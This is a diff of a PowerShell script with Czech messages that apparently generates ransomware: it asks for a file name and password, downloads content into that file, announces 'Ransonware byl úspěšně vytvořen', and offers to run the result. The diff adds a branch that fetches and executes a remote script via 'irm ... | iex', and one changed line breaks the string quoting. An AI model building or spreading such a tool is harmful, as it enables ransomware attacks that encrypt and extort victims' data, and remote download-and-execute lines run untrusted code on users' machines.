@@ -60,10 +60,7 @@ Clear-Host
 Add-Type -AssemblyName System.Windows.Forms
 
 $message = @"
- /------------------\
-| Ověřte si údaje |
- \------------------/
-
+Ověřte si údaje které jste zadali: 
 
 Jméno souboru: $OutputName
 Heslo: $password
@@ -98,18 +95,45 @@ if ($confirm -eq "Yes" -or $confirm -eq $blank){
     Clear-Host
     $createdYN = Test-Path .\$OutputName
     if ($createdYN) {
-    & {Add-Type -AssemblyName System.Windows.Forms; [System.Windows.Forms.MessageBox]::Show("Ransonware byl úspěšně vytvořen!", 'Vytvořeno!', 'OK', [System.Windows.Forms.MessageBoxIcon]::Information);}
+Add-Type -AssemblyName System.Windows.Forms
+
+$message = @"
+Úspěch!
+
+Jméno souboru: $OutputName
+"@
+
+[System.Windows.Forms.MessageBox]::Show($message, 'Vytvořeno!', [System.Windows.Forms.MessageBoxButtons]::OK, [System.Windows.Forms.MessageBoxIcon]::Information)
+
     #Write-Host "Ransonware byl uspesne vytvoren"
-    $EchoOffVariable = & {Add-Type -AssemblyName System.Windows.Forms; [System.Windows.Forms.MessageBox]::Show("Jméno: $OutputName", 'Vytvořeno!', 'OK', [System.Windows.Forms.MessageBoxIcon]::Information);}
     #Write-Host "$OutputName Ransonware vytvořen."
     }
     else {
-        Write-Host "ALE NEE... NECO SE POKAZILO"
-        Write-Host "---------------------------"
-        Write-Host "Script nemohl byt vytvoren z nejakeho duvodu D:"
+& {Add-Type -AssemblyName System.Windows.Forms; [System.Windows.Forms.MessageBox]::Show('Něco se pokazilo... nelze vytvořit script.', 'ALE NÉÉÉÉÉ', 'OK', [System.Windows.Forms.MessageBoxIcon]::Information);}
     }
 }
 elseif ($confirm -eq "No"){
+
+
+
+$exitrlly = & {Add-Type -AssemblyName System.Windows.Forms; [System.Windows.Forms.MessageBox]::Show("Ukončit?", 'Ukončování...', 'AbortRetryIgnore', [System.Windows.Forms.MessageBoxIcon]::Information);}
+if ($exitrlly -eq "Abort") {
+exit
+}
+
+elseif ($exitrlly -eq "Retry") {
+#zkusit znovu
+start powershell -Command "irm https://raw.githubusercontent.com/jakub-petrovic/virusk/main/creator.ps1 | iex"
+exit
+}
+
+elseif ($exitrlly -eq "Ignore") {
+#ignore
+exit
+}
+
+
+
     exit
 }
 else {
@@ -123,7 +147,7 @@ $request.Content | Add-Content -Path .\$OutputName
 
 
 #otevrit script (Y\N)
-$open = & {Add-Type -AssemblyName System.Windows.Forms; [System.Windows.Forms.MessageBox]::Show("Chcete otevřít script $OutputName?", 'Otevření', 'YesNo', [System.Windows.Forms.MessageBoxIcon]::Information);}
+$open = & {Add-Type -AssemblyName System.Windows.Forms; [System.Windows.Forms.MessageBox]::Show("Chcete otevřít script "$OutputName" ?", 'Otevření', 'YesNo', [System.Windows.Forms.MessageBoxIcon]::Information);}
 if ($open -eq "Yes") {
 . .\$OutputName
 }
